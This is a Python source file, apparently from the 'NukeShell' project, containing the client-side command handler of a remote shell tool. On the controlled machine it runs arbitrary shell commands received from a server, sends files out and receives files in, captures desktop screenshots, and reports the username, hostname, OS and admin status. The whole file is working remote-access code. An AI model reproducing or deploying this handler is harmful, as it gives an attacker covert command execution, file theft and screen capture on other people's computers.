#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : LimerBoy
# github.com/LimerBoy/NukeShell

# Import modules
from json import dumps
from time import ctime
from colorama import Fore
from getpass import getuser
from pyscreenshot import grab
from tempfile import gettempdir
from subprocess import getoutput
from platform import platform, node
from os import chdir, curdir, path, remove, name

""" Check if user is root/admin """
def IsAdmin() -> bool:
    if name == "nt":
        from ctypes import windll
        return windll.shell32.IsUserAnAdmin() != 0
    else:
        from os import getuid
        return getuid() == 0

""" Run shell command and get output """
def Run(command: str, server) -> str:
    # exit: Close connection
    if command.lower() == "exit":
        print(f"{Fore.GREEN}[Server => Client]{Fore.WHITE} Closing connection ...{Fore.RESET}")
        server.socket.close()
        raise SystemExit
    # CD: Change working directory
    elif command.lower()[:2] == "cd":
        dir = command[3:]
        if path.exists(dir):
            chdir(dir)
            output = "Directory changed to: " + dir
        else:
            output = "Directory not found: " + dir
    # PWD: Get current directory
    elif command.lower()[:3] == "pwd" and len(command) == 3:
        return f"{Fore.GREEN}[Server <= Client]{Fore.WHITE} Working directory is: " + path.abspath(curdir) + f"{Fore.RESET}\n"
    # PREFIX: Get username & computer name
    elif command.lower()[:22] == "get_commandline_string":
        usr_color = Fore.LIGHTRED_EX if IsAdmin() else Fore.LIGHTGREEN_EX
        output = f"{usr_color}{getuser()}{Fore.LIGHTWHITE_EX}@{node()} {Fore.LIGHTGREEN_EX}{path.abspath(curdir)}{Fore.LIGHTWHITE_EX}> {Fore.LIGHTBLUE_EX}"
    # Get user info
    elif command.startswith("get_user_info"):
        output = dumps({"system": platform(), "username": getuser(), "compname": node(), "time": ctime()})
    # UPLOAD: Send file from server to client
    elif command.startswith("begin_file_upload"):
        output = server.ReceiveFile()
    # DOWNLOAD: Send file from client to server
    elif command.startswith("begin_file_download"):
        file = command.split("*")[-1]
        output = server.SendFile(file)
    # SCREENSHOT: Get desktop screenshot
    elif command.startswith("create_screenshot"):
        file = path.join(gettempdir(), "screenshot.png")
        img = grab()
        img.save(file)
        output = server.SendFile(file)
        remove(file)
    # Get welcome message
    elif command.lower()[:18] == "get_welcome_string":
        output = \
            f"\n {Fore.YELLOW}----< Welcome >----" \
            f"\n {Fore.LIGHTYELLOW_EX}Connection encrypted using random {Fore.YELLOW}AES + RSA{Fore.LIGHTYELLOW_EX} key," \
            f"\n {Fore.LIGHTYELLOW_EX}Current time is {Fore.YELLOW}{ctime()}{Fore.LIGHTYELLOW_EX}," \
            f"\n {Fore.LIGHTYELLOW_EX}Welcome on {Fore.YELLOW}{node()}{Fore.LIGHTYELLOW_EX}, logged as {Fore.YELLOW}{getuser()}{Fore.LIGHTYELLOW_EX}," \
            f"\n {Fore.LIGHTYELLOW_EX}Running on system {Fore.YELLOW}{platform()}{Fore.LIGHTYELLOW_EX}.\n" \
            f"\n {Fore.YELLOW}----< Commands >----" \
            f"\n {Fore.YELLOW}upload{Fore.LIGHTYELLOW_EX} <local path> (Upload local file)" \
            f"\n {Fore.YELLOW}download{Fore.LIGHTYELLOW_EX} <remote path> (Download remote file)" \
            f"\n {Fore.YELLOW}screenshot{Fore.LIGHTYELLOW_EX} (Get desktop screenshot)" \
            f"\n {Fore.YELLOW}disconnect{Fore.LIGHTYELLOW_EX} (Stop shell)" \
            f"\n {Fore.YELLOW}exit{Fore.LIGHTYELLOW_EX} (Go back)"
    # SHELL: Execute shell command
    else:
        output = getoutput(command)

    return output


